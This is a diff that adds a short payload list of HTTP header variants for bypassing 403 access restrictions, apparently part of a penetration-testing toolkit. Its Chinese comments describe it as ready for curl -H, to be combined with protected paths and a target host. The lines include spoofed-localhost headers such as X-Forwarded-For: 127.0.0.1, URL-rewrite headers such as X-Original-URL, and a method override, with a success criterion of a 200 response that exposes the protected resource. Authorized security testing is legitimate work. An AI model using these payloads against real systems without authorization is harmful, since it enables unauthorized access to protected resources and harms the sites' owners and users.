@@ -1,0 +1,17 @@
+# 403 绕过请求头变体（curl -H 就绪；payload-mutation-algebra §7 头族配套）
+# 用法：与 403-bypass-paths.txt 组合测试；{PATH} 替换保护路径、{HOST} 替换目标主机
+# 判据：任一组合 200 且内容为保护资源 → 未授权访问（按 evidence-standard 未授权类判据确证）
+X-Original-URL: {PATH}
+X-Rewrite-URL: {PATH}
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: 0.0.0.0
+X-Real-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Host: 127.0.0.1
+Forwarded: for=127.0.0.1
+Referer: https://{HOST}/
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-HTTP-Method-Override: GET
